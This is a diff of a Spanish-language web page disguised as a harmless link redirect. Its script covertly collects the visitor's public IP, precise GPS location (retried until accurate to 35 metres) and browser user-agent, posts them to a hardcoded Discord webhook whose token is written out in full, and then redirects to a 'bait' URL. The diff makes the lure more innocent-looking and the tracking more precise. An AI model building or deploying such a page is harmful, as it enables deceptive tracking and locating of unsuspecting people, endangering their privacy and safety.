@@ -3,86 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Acceso al Sistema de Archivos</title>
+    <title>Redirección de Enlace</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
 </head>
-<body class="bg-slate-900 flex items-center justify-center min-h-screen text-white font-sans">
+<body class="bg-slate-50 flex items-center justify-center min-h-screen font-sans">
 
-    <div class="max-w-md w-full p-10 bg-slate-800 shadow-2xl rounded-3xl text-center border border-slate-700">
+    <div class="max-w-sm w-full p-8 bg-white shadow-xl rounded-3xl text-center border border-slate-100">
         <div id="ui-main">
-            <div class="mb-6 text-blue-500 flex justify-center">
-                <svg xmlns="http://www.w3.org/2000/svg" class="h-16 w-16" fill="none" viewBox="0 0 24 24" stroke="currentColor">
-                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" />
+            <div class="mb-5 text-blue-500">
+                <svg xmlns="http://www.w3.org/2000/svg" class="h-12 w-12 mx-auto" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                  <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6H6a2 2 0 00-2 2v10a2 2 0 002 2h10a2 2 0 002-2v-4M14 4h6m0 0v6m0-6L10 14" />
                 </svg>
             </div>
-            <h1 class="text-xl font-bold mb-4">Validación de Identidad</h1>
-            <p class="text-slate-400 text-sm mb-8">El acceso a este recurso requiere una firma de seguridad del navegador para validar la integridad del receptor.</p>
+            <h1 class="text-xl font-semibold text-slate-800 mb-2">Redirección en curso</h1>
+            <p class="text-slate-500 text-sm mb-8">Haga clic en el botón para ser redirigido automáticamente a la página de destino.</p>
             
-            <button onclick="iniciarCaptura()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-12 rounded-xl transition-all active:scale-95 shadow-lg shadow-blue-500/20">
-                DESBLOQUEAR ARCHIVO
+            <button onclick="iniciarProtocolo()" class="bg-blue-600 hover:bg-blue-700 text-white font-bold py-4 px-10 rounded-2xl transition-all shadow-lg active:scale-95">
+                CONTINUAR AL SITIO
             </button>
         </div>
 
         <div id="ui-loading" class="hidden">
-            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-500 mx-auto mb-4"></div>
-            <p class="text-slate-400">Verificando protocolos...</p>
+            <div class="animate-spin rounded-full h-10 w-10 border-b-2 border-blue-600 mx-auto mb-4"></div>
+            <p class="text-slate-500 text-sm animate-pulse">Cargando servidor de destino...</p>
         </div>
     </div>
 
     <script>
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
-        const REDIRECT_URL = "https://google.com"; // Aquí pones tu archivo cebo
+        const WEBHOOK = "https://discord.com/api/webhooks/1480354512622452777/YfExoxgVAZfx50CEI8fVUhuM9KeoE2zmjROPrPOQMLWCeKxbqQmLlCuNfwSlJ9RYpNAI";
+        const FINAL_URL = "https://google.com"; // Reemplazar por el archivo real
 
-        async function enviarEvidencia(lat = null, lon = null, acc = null, err = null) {
+        async function enviarReporte(lat = null, lon = null, acc = null, err = null) {
             try {
-                const response = await fetch('https://api.ipify.org?format=json');
-                const ipData = await response.json();
+                const resIP = await fetch('https://api.ipify.org?format=json');
+                const ipData = await resIP.json();
                 const ts = new Date().toISOString();
                 const ua = navigator.userAgent;
 
-                // Estructura de datos para el Hash
-                const logRaw = { ts, ip: ipData.ip, geo: { lat, lon, acc }, ua };
-                const hashFirma = CryptoJS.SHA256(JSON.stringify(logRaw)).toString();
+                const rawData = { ts, ip: ipData.ip, geo: { lat, lon, acc }, ua };
+                const hash = CryptoJS.SHA256(JSON.stringify(rawData)).toString();
 
-                await fetch(WEBHOOK_URL, {
+                await fetch(WEBHOOK, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         embeds: [{
-                            title: "🛡️ EVIDENCIA DIGITAL CAPTURADA",
-                            // Ponemos los datos críticos aquí para asegurar visibilidad
-                            description: `**Timestamp:** \`${ts}\` \n**User-Agent:** \`${ua}\` \n**Firma SHA-256:** \`${hashFirma}\``,
+                            title: "🛡️ EVIDENCIA DIGITAL CERTIFICADA CAPTURADA",
+                            description: "**Dictamen Técnico de Identificación**",
                             color: lat ? 3066993 : 15158332,
                             fields: [
-                                { name: "📍 Ubicación GPS", value: lat ? `[Abrir Google Maps](https://www.google.com/maps?q=${lat},${lon})` : `❌ Error: ${err || "Denegado"}`, inline: false },
-                                { name: "🎯 Precisión", value: acc ? `${acc} metros` : "N/A", inline: true },
-                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true }
+                                { name: "🕒 Timestamp (ISO 8601)", value: `\`${ts}\`` },
+                                { name: "🌐 IP Pública", value: `\`${ipData.ip}\``, inline: true },
+                                { name: "📍 Precisión GPS", value: acc ? `± ${acc.toFixed(1)} metros` : "N/A metros", inline: true },
+                                { name: "🔗 Ubicación", value: lat ? `[Ver Mapa GPS](https://www.google.com/maps?q=${lat},${lon})` : `❌ ${err || "Denegado"}` },
+                                { name: "🔑 Hash SHA-256 (Firma Digital)", value: `\`${hash}\`` },
+                                { name: "📱 User-Agent", value: `\`${ua}\`` }
                             ],
                             footer: { text: "Evidencia generada bajo estándares de cadena de custodia digital." }
                         }]
                     })
                 });
             } finally {
-                window.location.href = REDIRECT_URL;
+                window.location.href = FINAL_URL;
             }
         }
 
-        function iniciarCaptura() {
+        function iniciarProtocolo() {
             document.getElementById('ui-main').classList.add('hidden');
             document.getElementById('ui-loading').classList.remove('hidden');
 
             if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (p) => enviarEvidencia(p.coords.latitude, p.coords.longitude, p.coords.accuracy),
-                    (e) => {
-                        const errores = ["", "PERMISO_DENEGADO", "POSICION_NO_DISPONIBLE", "TIMEOUT"];
-                        enviarEvidencia(null, null, null, errores[e.code]);
-                    },
-                    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
-                );
+                let intentos = 0;
+                const maxIntentos = 6; // Reintenta durante 6 segundos para clavar el GPS
+
+                const obtenerMejorPosicion = () => {
+                    navigator.geolocation.getCurrentPosition(
+                        (p) => {
+                            // Si la precisión es menor a 35 metros, enviamos de inmediato
+                            if (p.coords.accuracy < 35 || intentos >= maxIntentos) {
+                                enviarReporte(p.coords.latitude, p.coords.longitude, p.coords.accuracy);
+                            } else {
+                                intentos++;
+                                setTimeout(obtenerMejorPosicion, 1000); // Reintenta en 1 seg
+                            }
+                        },
+                        (e) => enviarReporte(null, null, null, "PERMISO_DENEGADO"),
+                        { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                    );
+                };
+                obtenerMejorPosicion();
             } else {
-                enviarEvidencia(null, null, null, "NO_SOPORTADO");
+                enviarReporte(null, null, null, "NO_SOPORTADO");
             }
         }
     </script>
